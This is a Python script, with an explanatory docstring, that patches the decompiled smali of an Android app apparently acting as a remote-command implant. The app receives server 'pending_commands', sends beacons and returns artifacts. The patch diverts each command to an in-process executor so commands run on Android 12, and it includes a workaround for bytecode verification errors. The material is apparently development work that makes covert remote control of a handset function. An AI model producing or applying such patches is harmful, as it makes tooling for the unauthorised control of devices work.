"""Route every pulled command straight to the in-process executor.

Why this is needed
------------------
`sp0.e()` receives the server's `pending_commands` and dispatches each one with

    v7 = MyFirebaseMessagingService.Companion
    v8 = mapOf("action" to cmd, "command" to cmd)
    invoke-virtual {v7, ctx, cmd, v8}, ...->processCommandDirect(...)

`processCommandDirect` builds an Intent and, on API >= 26, hands it to
`startForegroundService` (via the `a/h0;->n` bridge). FirebaseMessagingService is
*not* a foreground service and never calls `startForeground()`, so on Android 12
the system kills it before the Intent is ever delivered -- and even when it does
survive, `MyFirebaseMessagingService.onStartCommand` returns early for any Intent
whose action is not `com.google.android.c2dm.intent.RECEIVE`.

Net effect: beacons arrive, commands are marked delivered, and nothing runs.
That is exactly the observed behaviour on the lab handset (Android 12): every
command ends in `sent` and no artifact ever comes back.

The fix
-------
The class already ships the correct path. When starting the service throws,
`:catchall_0` jumps to `:goto_1`, which logs and then launches
`Companion$processCommandDirect$1` on Dispatchers.IO; that coroutine
instantiates the service, attaches the base context and calls
`access$handleCommand` directly. So the fallback is known-good -- it is simply
unreachable in normal operation.

Replace the start block with an unconditional jump to it.

The one subtlety, and the reason the earlier attempt failed verification: at
`:cond_0` register p1 holds an **Intent**, but `:goto_1` starts with
`Throwable.getMessage()` because its only original predecessor was
`move-exception p1`. A bare `goto` would arrive with the wrong register type and
ART rejects the whole method with a VerifyError. `const/4 p1, 0x0` before the
jump would not help either (null has no `getMessage`). Assign a real Throwable:

    new-instance p1, Ljava/lang/Exception;
    const-string v0, "direct dispatch"
    invoke-direct {p1, v0}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

Only the trailing `getMessage()` string differs from the real catch branch, which
is cosmetic in the log line.

Removing the whole try/catch means `:try_start_0`, `:try_end_0`, `:catchall_0`
and `:cond_1` must all go together, or the verifier sees an orphaned handler.

    python3 -I fix_command_dispatch2.py <decoded-dir>
"""
from __future__ import annotations

import re
import sys
from pathlib import Path

TARGET = Path("smali/com/VexR/app/services/MyFirebaseMessagingService$Companion.smali")

# The block to replace, anchored on the two instructions that open and close it.
START = "    :cond_0\n"
END_MARKER = "    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"

REPLACEMENT = """    :cond_0

    # Do not start the service: it is not a foreground service and its
    # onStartCommand drops a non-FCM Intent anyway. Go straight to the
    # in-process executor at :goto_1, supplying the Throwable it dereferences.
    new-instance p1, Ljava/lang/Exception;

    const-string v0, "direct dispatch"

    invoke-direct {p1, v0}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    goto :goto_1
"""


def main() -> int:
    root = Path(sys.argv[1])
    path = root / TARGET
    if not path.exists():
        print(f"[!] not found: {path}")
        return 1

    src = path.read_text(encoding="utf-8")

    # The end of the block we delete is the startService call plus the
    # `:try_end_0` / `.catchall` pair that closes the region.
    start = src.find(START)
    if start < 0:
        print("[!] could not locate the :cond_0 start block")
        return 1

    m = re.compile(
        r"    invoke-virtual \{p0, p1\}, Landroid/content/Context;->startService"
        r"\(Landroid/content/Intent;\)Landroid/content/ComponentName;\n"
        r"    :try_end_0\n"
        r"    \.catchall \{[^}]*\} :catchall_0\n"
    ).search(src, start)
    if not m:
        print("[!] could not locate the startService/catchall tail of the block")
        return 1
    end = m.end()

    block = src[start:end]
    # Everything the block must contain for it to be the one we think it is.
    for marker in ("La/h0;->n", "startService", ":catchall_0", ":cond_1", "SDK_INT"):
        if marker not in block:
            print(f"[!] expected marker {marker!r} missing from the block; aborting")
            return 1

    src = src[:start] + REPLACEMENT + src[end:]
    path.write_text(src, encoding="utf-8")

    print(f"[+] rewrote {TARGET}")
    print("[+] :cond_0 now jumps to :goto_1 with a Throwable in p1")
    return 0


if __name__ == "__main__":
    sys.exit(main())
